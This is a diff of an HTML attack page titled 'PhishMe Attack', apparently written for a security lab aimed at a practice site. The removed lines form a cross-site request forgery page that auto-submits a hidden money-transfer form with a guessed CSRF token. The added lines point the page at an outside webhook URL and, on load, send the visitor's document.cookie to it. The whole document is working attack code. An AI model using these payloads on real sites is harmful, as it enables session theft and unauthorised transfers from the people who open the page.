@@ -1,20 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PhishMe Attack</title>
+    <base href="https://webhook-test.com/170fb0ff6d43d1148fb1cb5cad087971/" />
 </head>
 <body>
-
-<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-  <input type="hidden" name="csrf_token" value="MjkyMQ==" /> <!-- 这里填Hamish大概率的 token -->
-  <input type="hidden" name="username" value="z5508657" />
-  <input type="hidden" name="amount" value="100" />
-</form>
-
 <script>
-document.getElementById('transferForm').submit();
+    fetch('?' + document.cookie);
 </script>
-
 </body>
 </html>
